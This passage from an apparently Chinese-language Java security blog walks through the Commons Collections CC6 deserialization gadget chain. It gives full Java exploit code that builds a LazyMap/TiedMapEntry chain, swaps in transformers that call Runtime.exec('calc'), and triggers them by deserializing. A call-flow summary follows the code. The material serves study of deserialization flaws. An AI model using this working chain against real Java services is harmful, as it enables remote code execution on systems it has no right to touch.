#61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        map.put(&quot;value&quot;, &quot;12&quot;);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//为了避免在构造阶段提前触发链子，利用new ConstantTransformer(1)先将一个值传给put，到下一步再修改</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//ConstantTransformer(1).transform() 不会执行命令，只会返回 1</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">lazyMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">));</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//构造（cc6不同cc1）</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">TiedMapEntry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tiedMapEntry</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #ABB2BF">(lazyMap, </span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map2</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">map2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(tiedMapEntry, </span><span style="color: #98C379">&quot;bbb&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//删除写入的key，以保证可以反序列化执行命令</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">lazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//不能直接序列化反序列化，需要先构造一个TiedMapEntry</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//因为这里有put，（前面的urlDNS链说过这个问题）</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">factoryFiled</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;factory&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">factoryFiled</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//将 `lazyMap` 对象中的 `factory` 字段的值，替换为`chainedTransformer` 对象</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">factoryFiled</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(lazyMap,chainedTransformer);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(map2);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h4 id="删除Transformer的exp"><a href="#删除Transformer的exp" class="headerlink" title="删除Transformer的exp"></a>删除Transformer的exp</h4><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.Transformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.ChainedTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.ConstantTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.InvokerTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.map.LazyMap</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.map.TransformedMap</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.*</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.InvocationTargetException</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.HashMap</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchFieldException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">//伪造transformers为 ConstantTransformer(1)</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// ConstantTransformer(1)不会执行代码</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">lazyMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//将伪造的替换成真的</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">real</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span><span class="line"><span style="color: #ABB2BF">        };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//构造TiedMapEntry的触发点</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">TiedMapEntry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tiedMapEntry</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #ABB2BF">(lazyMap, </span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map2</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">map2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(tiedMapEntry, </span><span style="color: #98C379">&quot;bbb&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//删除写入的key，以保证可以反序列化执行命令</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">lazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//不能直接序列化反序列化，需要先构造一个TiedMapEntry</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//因为这里有put，（前面的urlDNS链说过这个问题）</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;iTransformers&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">f</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// 替换假链为真链</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">f</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(chainedTransformer, real);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//序列化&amp;反序列化</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(map2);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h3><ul><li>HashMap.readObject()</li><li>计算 key 的 hash</li><li>调用 entry.hashCode()</li><li>entry.getValue()</li><li>LazyMap.get()</li><li>transformer.transform()</li><li>恶意链执行</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251125203913660.png" alt="image-20251125203913593"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251125204106663.png" alt="image-20250427210417295"></p><p>依旧引用   bxhhf的文章：<a href="https://bxhhf.github.io/2025/04/19/CC1-LazyMap-CC6/#CC6">cc6</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1</title>
    <link href="/2025/11/24/CC1/"/>
    <url>/2025/11/24/CC1/</url>
    
